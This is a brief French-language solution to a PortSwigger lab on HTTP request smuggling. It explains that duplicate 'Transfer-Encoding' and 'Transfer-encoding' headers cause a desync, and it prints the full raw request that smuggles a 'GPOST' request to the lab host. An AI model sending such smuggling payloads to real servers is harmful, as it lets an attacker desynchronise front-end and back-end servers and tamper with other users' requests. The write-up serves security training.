# Lab

https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header

## Solution

Avec l'extension `HTTP Request Smuggler` on trouve qu'une attaque peut être menée avec deux headers `Transfer-Encoding` et `Transfer-encoding`.

```http
POST / HTTP/1.1
Host: 0a3e000803e0601b80c7497500750052.web-security-academy.net
Cookie: session=7qdjiXECplsO3x2ukCZXt90FLhcmfVJ2
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Connection: close
Transfer-encoding: identity
Content-Length: 4

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```